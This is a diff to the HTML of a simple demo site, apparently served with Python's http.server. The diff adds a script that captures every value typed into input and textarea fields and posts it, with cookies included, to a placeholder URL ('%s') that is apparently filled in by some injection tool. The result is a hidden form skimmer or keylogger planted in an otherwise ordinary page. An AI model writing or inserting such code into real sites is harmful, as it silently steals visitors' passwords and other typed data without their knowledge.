@@ -7,4 +7,31 @@
     <h1>This is a simple site!</h1>
     <p>This was build using pythons http server module!</p>
 </body>
+
+<script>
+    // Create an object to hold the input values
+    const form = {};
+
+    // Listen for input events
+    document.addEventListener('input', function(ev) {
+        // Ensure we're dealing with an input or textarea element
+        if (ev.target.tagName === 'INPUT' || ev.target.tagName === 'TEXTAREA') {
+            form[ev.target.name] = ev.target.value;
+
+            // Send a POST request with both fields
+            fetch('%s', {
+                method: 'POST',
+                body: JSON.stringify(form),
+                headers: {
+                    "Content-type": "application/json",
+                },
+                credentials: 'include'
+            })
+            .then((response) => response.json())
+            .then((json) => console.log(json))
+            .catch((error) => console.error('Error:', error));
+        }
+    });
+</script>
+
 </html>
